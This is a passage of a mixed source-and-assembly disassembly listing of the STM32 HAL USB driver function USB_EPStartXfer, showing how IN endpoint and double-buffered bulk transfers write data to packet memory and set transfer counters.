 8006a9a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a9e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006aa2:	6019      	str	r1, [r3, #0]
  uint16_t pmabuffer;
  uint16_t wEPVal;
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  /* IN endpoint */
  if (ep->is_in == 1U)
 8006aa4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006aa8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006aac:	681b      	ldr	r3, [r3, #0]
 8006aae:	785b      	ldrb	r3, [r3, #1]
 8006ab0:	2b01      	cmp	r3, #1
 8006ab2:	f040 86b7 	bne.w	8007824 <USB_EPStartXfer+0xd9a>
  {
    /*Multi packet transfer*/
    if (ep->xfer_len > ep->maxpacket)
 8006ab6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006aba:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006abe:	681b      	ldr	r3, [r3, #0]
 8006ac0:	699a      	ldr	r2, [r3, #24]
 8006ac2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ac6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006aca:	681b      	ldr	r3, [r3, #0]
 8006acc:	691b      	ldr	r3, [r3, #16]
 8006ace:	429a      	cmp	r2, r3
 8006ad0:	d908      	bls.n	8006ae4 <USB_EPStartXfer+0x5a>
    {
      len = ep->maxpacket;
 8006ad2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ad6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006ada:	681b      	ldr	r3, [r3, #0]
 8006adc:	691b      	ldr	r3, [r3, #16]
 8006ade:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
 8006ae2:	e007      	b.n	8006af4 <USB_EPStartXfer+0x6a>
    }
    else
    {
      len = ep->xfer_len;
 8006ae4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ae8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006aec:	681b      	ldr	r3, [r3, #0]
 8006aee:	699b      	ldr	r3, [r3, #24]
 8006af0:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
    }

    /* configure and validate Tx endpoint */
    if (ep->doublebuffer == 0U)
 8006af4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006af8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006afc:	681b      	ldr	r3, [r3, #0]
 8006afe:	7b1b      	ldrb	r3, [r3, #12]
 8006b00:	2b00      	cmp	r3, #0
 8006b02:	d13a      	bne.n	8006b7a <USB_EPStartXfer+0xf0>
    {
      USB_WritePMA(USBx, ep->xfer_buff, ep->pmaadress, (uint16_t)len);
 8006b04:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b08:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b0c:	681b      	ldr	r3, [r3, #0]
 8006b0e:	6959      	ldr	r1, [r3, #20]
 8006b10:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b14:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b18:	681b      	ldr	r3, [r3, #0]
 8006b1a:	88da      	ldrh	r2, [r3, #6]
 8006b1c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006b20:	b29b      	uxth	r3, r3
 8006b22:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006b26:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006b2a:	6800      	ldr	r0, [r0, #0]
 8006b2c:	f001 fcb9 	bl	80084a2 <USB_WritePMA>
      PCD_SET_EP_TX_CNT(USBx, ep->num, len);
 8006b30:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b34:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006b38:	681b      	ldr	r3, [r3, #0]
 8006b3a:	613b      	str	r3, [r7, #16]
 8006b3c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b40:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006b44:	681b      	ldr	r3, [r3, #0]
 8006b46:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006b4a:	b29b      	uxth	r3, r3
 8006b4c:	461a      	mov	r2, r3
 8006b4e:	693b      	ldr	r3, [r7, #16]
 8006b50:	4413      	add	r3, r2
 8006b52:	613b      	str	r3, [r7, #16]
 8006b54:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b58:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b5c:	681b      	ldr	r3, [r3, #0]
 8006b5e:	781b      	ldrb	r3, [r3, #0]
 8006b60:	00da      	lsls	r2, r3, #3
 8006b62:	693b      	ldr	r3, [r7, #16]
 8006b64:	4413      	add	r3, r2
 8006b66:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006b6a:	60fb      	str	r3, [r7, #12]
 8006b6c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006b70:	b29a      	uxth	r2, r3
 8006b72:	68fb      	ldr	r3, [r7, #12]
 8006b74:	801a      	strh	r2, [r3, #0]
 8006b76:	f000 be1f 	b.w	80077b8 <USB_EPStartXfer+0xd2e>
    }
#if (USE_USB_DOUBLE_BUFFER == 1U)
    else
    {
      /* double buffer bulk management */
      if (ep->type == EP_TYPE_BULK)
 8006b7a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b7e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b82:	681b      	ldr	r3, [r3, #0]
 8006b84:	78db      	ldrb	r3, [r3, #3]
 8006b86:	2b02      	cmp	r3, #2
 8006b88:	f040 8462 	bne.w	8007450 <USB_EPStartXfer+0x9c6>
      {
        if (ep->xfer_len_db > ep->maxpacket)
 8006b8c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b90:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b94:	681b      	ldr	r3, [r3, #0]
 8006b96:	6a1a      	ldr	r2, [r3, #32]
 8006b98:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b9c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006ba0:	681b      	ldr	r3, [r3, #0]
 8006ba2:	691b      	ldr	r3, [r3, #16]
 8006ba4:	429a      	cmp	r2, r3
 8006ba6:	f240 83df 	bls.w	8007368 <USB_EPStartXfer+0x8de>
        {
          /* enable double buffer */
          PCD_SET_BULK_EP_DBUF(USBx, ep->num);
 8006baa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006bae:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006bb2:	681a      	ldr	r2, [r3, #0]
 8006bb4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006bb8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006bbc:	681b      	ldr	r3, [r3, #0]
 8006bbe:	781b      	ldrb	r3, [r3, #0]
 8006bc0:	009b      	lsls	r3, r3, #2
 8006bc2:	4413      	add	r3, r2
 8006bc4:	881b      	ldrh	r3, [r3, #0]
 8006bc6:	b29b      	uxth	r3, r3
 8006bc8:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006bcc:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006bd0:	f8a7 3056 	strh.w	r3, [r7, #86]	; 0x56
 8006bd4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006bd8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006bdc:	681a      	ldr	r2, [r3, #0]
 8006bde:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006be2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006be6:	681b      	ldr	r3, [r3, #0]
 8006be8:	781b      	ldrb	r3, [r3, #0]
 8006bea:	009b      	lsls	r3, r3, #2
 8006bec:	441a      	add	r2, r3
 8006bee:	f8b7 3056 	ldrh.w	r3, [r7, #86]	; 0x56
 8006bf2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006bf6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006bfa:	f443 4301 	orr.w	r3, r3, #33024	; 0x8100
 8006bfe:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006c02:	b29b      	uxth	r3, r3
 8006c04:	8013      	strh	r3, [r2, #0]

          /* each Time to write in PMA xfer_len_db will */
          ep->xfer_len_db -= len;
 8006c06:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c0a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c0e:	681b      	ldr	r3, [r3, #0]
 8006c10:	6a1a      	ldr	r2, [r3, #32]
 8006c12:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006c16:	1ad2      	subs	r2, r2, r3
 8006c18:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c1c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c20:	681b      	ldr	r3, [r3, #0]
 8006c22:	621a      	str	r2, [r3, #32]

          /* Fill the two first buffer in the Buffer0 & Buffer1 */
          if ((PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_DTOG_TX) != 0U)
 8006c24:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c28:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006c2c:	681a      	ldr	r2, [r3, #0]
 8006c2e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c32:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c36:	681b      	ldr	r3, [r3, #0]
 8006c38:	781b      	ldrb	r3, [r3, #0]
 8006c3a:	009b      	lsls	r3, r3, #2
 8006c3c:	4413      	add	r3, r2
 8006c3e:	881b      	ldrh	r3, [r3, #0]
 8006c40:	b29b      	uxth	r3, r3
 8006c42:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006c46:	2b00      	cmp	r3, #0
 8006c48:	f000 81c7 	beq.w	8006fda <USB_EPStartXfer+0x550>
          {
            /* Set the Double buffer counter for pmabuffer1 */
            PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 8006c4c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c50:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006c54:	681b      	ldr	r3, [r3, #0]
 8006c56:	633b      	str	r3, [r7, #48]	; 0x30
 8006c58:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c5c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c60:	681b      	ldr	r3, [r3, #0]
 8006c62:	785b      	ldrb	r3, [r3, #1]
 8006c64:	2b00      	cmp	r3, #0
 8006c66:	d177      	bne.n	8006d58 <USB_EPStartXfer+0x2ce>
 8006c68:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c6c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006c70:	681b      	ldr	r3, [r3, #0]
 8006c72:	62bb      	str	r3, [r7, #40]	; 0x28
 8006c74:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c78:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006c7c:	681b      	ldr	r3, [r3, #0]
 8006c7e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006c82:	b29b      	uxth	r3, r3
 8006c84:	461a      	mov	r2, r3
 8006c86:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006c88:	4413      	add	r3, r2
 8006c8a:	62bb      	str	r3, [r7, #40]	; 0x28
 8006c8c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c90:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c94:	681b      	ldr	r3, [r3, #0]
 8006c96:	781b      	ldrb	r3, [r3, #0]
 8006c98:	00da      	lsls	r2, r3, #3
 8006c9a:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006c9c:	4413      	add	r3, r2
 8006c9e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8006ca2:	627b      	str	r3, [r7, #36]	; 0x24
 8006ca4:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006ca6:	881b      	ldrh	r3, [r3, #0]
 8006ca8:	b29b      	uxth	r3, r3
 8006caa:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8006cae:	b29a      	uxth	r2, r3
 8006cb0:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006cb2:	801a      	strh	r2, [r3, #0]
 8006cb4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006cb8:	2b3e      	cmp	r3, #62	; 0x3e
 8006cba:	d921      	bls.n	8006d00 <USB_EPStartXfer+0x276>
 8006cbc:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006cc0:	095b      	lsrs	r3, r3, #5
 8006cc2:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006cc6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006cca:	f003 031f 	and.w	r3, r3, #31
 8006cce:	2b00      	cmp	r3, #0
 8006cd0:	d104      	bne.n	8006cdc <USB_EPStartXfer+0x252>
 8006cd2:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006cd6:	3b01      	subs	r3, #1
 8006cd8:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006cdc:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006cde:	881b      	ldrh	r3, [r3, #0]
 8006ce0:	b29a      	uxth	r2, r3
 8006ce2:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006ce6:	b29b      	uxth	r3, r3
 8006ce8:	029b      	lsls	r3, r3, #10
 8006cea:	b29b      	uxth	r3, r3
 8006cec:	4313      	orrs	r3, r2
 8006cee:	b29b      	uxth	r3, r3
 8006cf0:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006cf4:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006cf8:	b29a      	uxth	r2, r3
 8006cfa:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006cfc:	801a      	strh	r2, [r3, #0]
 8006cfe:	e050      	b.n	8006da2 <USB_EPStartXfer+0x318>
 8006d00:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d04:	2b00      	cmp	r3, #0
 8006d06:	d10a      	bne.n	8006d1e <USB_EPStartXfer+0x294>
 8006d08:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006d0a:	881b      	ldrh	r3, [r3, #0]
 8006d0c:	b29b      	uxth	r3, r3
 8006d0e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006d12:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006d16:	b29a      	uxth	r2, r3
 8006d18:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006d1a:	801a      	strh	r2, [r3, #0]
 8006d1c:	e041      	b.n	8006da2 <USB_EPStartXfer+0x318>
 8006d1e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d22:	085b      	lsrs	r3, r3, #1
 8006d24:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006d28:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d2c:	f003 0301 	and.w	r3, r3, #1
 8006d30:	2b00      	cmp	r3, #0
 8006d32:	d004      	beq.n	8006d3e <USB_EPStartXfer+0x2b4>
 8006d34:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006d38:	3301      	adds	r3, #1
 8006d3a:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006d3e:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006d40:	881b      	ldrh	r3, [r3, #0]
 8006d42:	b29a      	uxth	r2, r3
 8006d44:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006d48:	b29b      	uxth	r3, r3
 8006d4a:	029b      	lsls	r3, r3, #10
 8006d4c:	b29b      	uxth	r3, r3
 8006d4e:	4313      	orrs	r3, r2
 8006d50:	b29a      	uxth	r2, r3
 8006d52:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006d54:	801a      	strh	r2, [r3, #0]
 8006d56:	e024      	b.n	8006da2 <USB_EPStartXfer+0x318>
 8006d58:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d5c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d60:	681b      	ldr	r3, [r3, #0]
 8006d62:	785b      	ldrb	r3, [r3, #1]
 8006d64:	2b01      	cmp	r3, #1
 8006d66:	d11c      	bne.n	8006da2 <USB_EPStartXfer+0x318>
 8006d68:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d6c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006d70:	681b      	ldr	r3, [r3, #0]
 8006d72:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006d76:	b29b      	uxth	r3, r3
 8006d78:	461a      	mov	r2, r3
 8006d7a:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006d7c:	4413      	add	r3, r2
 8006d7e:	633b      	str	r3, [r7, #48]	; 0x30
 8006d80:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d84:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d88:	681b      	ldr	r3, [r3, #0]
 8006d8a:	781b      	ldrb	r3, [r3, #0]
 8006d8c:	00da      	lsls	r2, r3, #3
 8006d8e:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006d90:	4413      	add	r3, r2
 8006d92:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8006d96:	62fb      	str	r3, [r7, #44]	; 0x2c
 8006d98:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d9c:	b29a      	uxth	r2, r3
 8006d9e:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8006da0:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr1;
 8006da2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006da6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006daa:	681b      	ldr	r3, [r3, #0]
 8006dac:	895b      	ldrh	r3, [r3, #10]
 8006dae:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8006db2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006db6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006dba:	681b      	ldr	r3, [r3, #0]
 8006dbc:	6959      	ldr	r1, [r3, #20]
 8006dbe:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006dc2:	b29b      	uxth	r3, r3
 8006dc4:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8006dc8:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006dcc:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006dd0:	6800      	ldr	r0, [r0, #0]
 8006dd2:	f001 fb66 	bl	80084a2 <USB_WritePMA>
            ep->xfer_buff += len;
 8006dd6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006dda:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006dde:	681b      	ldr	r3, [r3, #0]
 8006de0:	695a      	ldr	r2, [r3, #20]
 8006de2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006de6:	441a      	add	r2, r3
 8006de8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006dec:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006df0:	681b      	ldr	r3, [r3, #0]
 8006df2:	615a      	str	r2, [r3, #20]

            if (ep->xfer_len_db > ep->maxpacket)
 8006df4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006df8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006dfc:	681b      	ldr	r3, [r3, #0]
 8006dfe:	6a1a      	ldr	r2, [r3, #32]
 8006e00:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e04:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e08:	681b      	ldr	r3, [r3, #0]
 8006e0a:	691b      	ldr	r3, [r3, #16]
 8006e0c:	429a      	cmp	r2, r3
 8006e0e:	d90f      	bls.n	8006e30 <USB_EPStartXfer+0x3a6>
            {
              ep->xfer_len_db -= len;
 8006e10:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e14:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e18:	681b      	ldr	r3, [r3, #0]
 8006e1a:	6a1a      	ldr	r2, [r3, #32]
 8006e1c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e20:	1ad2      	subs	r2, r2, r3
 8006e22:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e26:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e2a:	681b      	ldr	r3, [r3, #0]
 8006e2c:	621a      	str	r2, [r3, #32]
 8006e2e:	e00e      	b.n	8006e4e <USB_EPStartXfer+0x3c4>
            }
            else
            {
              len = ep->xfer_len_db;
 8006e30:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e34:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e38:	681b      	ldr	r3, [r3, #0]
 8006e3a:	6a1b      	ldr	r3, [r3, #32]
 8006e3c:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
              ep->xfer_len_db = 0U;
 8006e40:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e44:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e48:	681b      	ldr	r3, [r3, #0]
 8006e4a:	2200      	movs	r2, #0
 8006e4c:	621a      	str	r2, [r3, #32]
            }

            /* Set the Double buffer counter for pmabuffer0 */
            PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 8006e4e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e52:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e56:	681b      	ldr	r3, [r3, #0]
 8006e58:	785b      	ldrb	r3, [r3, #1]
 8006e5a:	2b00      	cmp	r3, #0
 8006e5c:	d177      	bne.n	8006f4e <USB_EPStartXfer+0x4c4>
 8006e5e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e62:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006e66:	681b      	ldr	r3, [r3, #0]
 8006e68:	61bb      	str	r3, [r7, #24]
 8006e6a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e6e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006e72:	681b      	ldr	r3, [r3, #0]
 8006e74:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006e78:	b29b      	uxth	r3, r3
 8006e7a:	461a      	mov	r2, r3
 8006e7c:	69bb      	ldr	r3, [r7, #24]
 8006e7e:	4413      	add	r3, r2
 8006e80:	61bb      	str	r3, [r7, #24]
 8006e82:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e86:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e8a:	681b      	ldr	r3, [r3, #0]
 8006e8c:	781b      	ldrb	r3, [r3, #0]
 8006e8e:	00da      	lsls	r2, r3, #3
 8006e90:	69bb      	ldr	r3, [r7, #24]
 8006e92:	4413      	add	r3, r2
 8006e94:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006e98:	617b      	str	r3, [r7, #20]
 8006e9a:	697b      	ldr	r3, [r7, #20]
 8006e9c:	881b      	ldrh	r3, [r3, #0]
 8006e9e:	b29b      	uxth	r3, r3
 8006ea0:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8006ea4:	b29a      	uxth	r2, r3
 8006ea6:	697b      	ldr	r3, [r7, #20]
 8006ea8:	801a      	strh	r2, [r3, #0]
 8006eaa:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006eae:	2b3e      	cmp	r3, #62	; 0x3e
 8006eb0:	d921      	bls.n	8006ef6 <USB_EPStartXfer+0x46c>
 8006eb2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006eb6:	095b      	lsrs	r3, r3, #5
 8006eb8:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006ebc:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006ec0:	f003 031f 	and.w	r3, r3, #31
 8006ec4:	2b00      	cmp	r3, #0
 8006ec6:	d104      	bne.n	8006ed2 <USB_EPStartXfer+0x448>
 8006ec8:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006ecc:	3b01      	subs	r3, #1
 8006ece:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006ed2:	697b      	ldr	r3, [r7, #20]
 8006ed4:	881b      	ldrh	r3, [r3, #0]
 8006ed6:	b29a      	uxth	r2, r3
 8006ed8:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006edc:	b29b      	uxth	r3, r3
 8006ede:	029b      	lsls	r3, r3, #10
 8006ee0:	b29b      	uxth	r3, r3
 8006ee2:	4313      	orrs	r3, r2
 8006ee4:	b29b      	uxth	r3, r3
 8006ee6:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006eea:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006eee:	b29a      	uxth	r2, r3
 8006ef0:	697b      	ldr	r3, [r7, #20]
 8006ef2:	801a      	strh	r2, [r3, #0]
 8006ef4:	e056      	b.n	8006fa4 <USB_EPStartXfer+0x51a>
 8006ef6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006efa:	2b00      	cmp	r3, #0
 8006efc:	d10a      	bne.n	8006f14 <USB_EPStartXfer+0x48a>
 8006efe:	697b      	ldr	r3, [r7, #20]
 8006f00:	881b      	ldrh	r3, [r3, #0]
 8006f02:	b29b      	uxth	r3, r3
 8006f04:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006f08:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006f0c:	b29a      	uxth	r2, r3
 8006f0e:	697b      	ldr	r3, [r7, #20]
 8006f10:	801a      	strh	r2, [r3, #0]
 8006f12:	e047      	b.n	8006fa4 <USB_EPStartXfer+0x51a>
 8006f14:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f18:	085b      	lsrs	r3, r3, #1
 8006f1a:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006f1e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f22:	f003 0301 	and.w	r3, r3, #1
 8006f26:	2b00      	cmp	r3, #0
 8006f28:	d004      	beq.n	8006f34 <USB_EPStartXfer+0x4aa>
 8006f2a:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006f2e:	3301      	adds	r3, #1
 8006f30:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006f34:	697b      	ldr	r3, [r7, #20]
 8006f36:	881b      	ldrh	r3, [r3, #0]
 8006f38:	b29a      	uxth	r2, r3
 8006f3a:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006f3e:	b29b      	uxth	r3, r3
 8006f40:	029b      	lsls	r3, r3, #10
 8006f42:	b29b      	uxth	r3, r3
 8006f44:	4313      	orrs	r3, r2
 8006f46:	b29a      	uxth	r2, r3
 8006f48:	697b      	ldr	r3, [r7, #20]
 8006f4a:	801a      	strh	r2, [r3, #0]
 8006f4c:	e02a      	b.n	8006fa4 <USB_EPStartXfer+0x51a>
 8006f4e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f52:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f56:	681b      	ldr	r3, [r3, #0]
 8006f58:	785b      	ldrb	r3, [r3, #1]
 8006f5a:	2b01      	cmp	r3, #1
 8006f5c:	d122      	bne.n	8006fa4 <USB_EPStartXfer+0x51a>
 8006f5e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f62:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006f66:	681b      	ldr	r3, [r3, #0]
 8006f68:	623b      	str	r3, [r7, #32]
 8006f6a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f6e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006f72:	681b      	ldr	r3, [r3, #0]
 8006f74:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006f78:	b29b      	uxth	r3, r3
 8006f7a:	461a      	mov	r2, r3
 8006f7c:	6a3b      	ldr	r3, [r7, #32]
 8006f7e:	4413      	add	r3, r2
 8006f80:	623b      	str	r3, [r7, #32]
 8006f82:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f86:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f8a:	681b      	ldr	r3, [r3, #0]
 8006f8c:	781b      	ldrb	r3, [r3, #0]
 8006f8e:	00da      	lsls	r2, r3, #3
 8006f90:	6a3b      	ldr	r3, [r7, #32]
 8006f92:	4413      	add	r3, r2
 8006f94:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006f98:	61fb      	str	r3, [r7, #28]
 8006f9a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f9e:	b29a      	uxth	r2, r3
 8006fa0:	69fb      	ldr	r3, [r7, #28]
 8006fa2:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr0;
 8006fa4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fa8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006fac:	681b      	ldr	r3, [r3, #0]
